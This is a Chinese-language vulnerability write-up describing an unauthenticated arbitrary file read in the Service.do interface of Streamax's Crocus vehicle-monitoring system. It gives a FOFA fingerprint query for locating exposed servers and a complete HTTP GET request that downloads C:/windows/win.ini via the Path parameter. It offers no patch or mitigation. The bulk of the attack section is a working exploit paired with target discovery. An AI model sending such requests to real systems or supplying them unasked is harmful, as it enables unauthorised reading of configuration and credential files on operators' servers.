# 深圳市锐明技术股份有限公司Crocus系统Service.do任意文件读取漏洞

# 一、漏洞简介
锐明技术作为一家专注于AI和视频技术的商用车智能物联（AIoT）解决方案提供商，Crocus系统是其核心产品之一。Crocus系统旨在利用人工智能、高清视频、大数据和自动驾驶技术，帮助商用车减少交通事故和货物丢失，提高企业或车队的运营效率。通过车载摄像头、毫米波雷达等传感器，实现对车辆周围环境的实时感知和监控，提高驾驶安全性。利用AI技术，系统能够识别车辆和行人的身份，并分析驾驶员的驾驶行为，及时提醒驾驶员注意潜在风险。Crocus系统能够实时监控货箱状态，包括货物是否丢失、货箱是否关闭等，并通过3D检测技术实现更精准的货物识别和管理。锐明技术Crocus系统 Service.do接口存在任意文件读取漏洞，未经过身份验证的远程攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 二、影响版本
+ Crocus系统

# 三、资产测绘
+ fofa`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`
+ 特征

![1720274332352-c9c6a280-a643-4bac-95f0-0f7942a72149.png](./img/5AiGbcw52EzAXtrg/1720274332352-c9c6a280-a643-4bac-95f0-0f7942a72149-759009.png)

# 四、漏洞复现
```http
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: 
Accept-Encoding:gzip,deflate,br
Accept:*/*
Accept-Language:en-US;q=0.9,en;q=0.8
User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/124.0.6367.118Safari/537.36
Connection:close
Cache-Control:max-age=0
```

![1720274359372-2627708f-1f2b-442d-b494-cde20eb53e86.png](./img/5AiGbcw52EzAXtrg/1720274359372-2627708f-1f2b-442d-b494-cde20eb53e86-480553.png)



> 更新: 2024-07-20 20:13:56  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kgxxkp7cach713ge>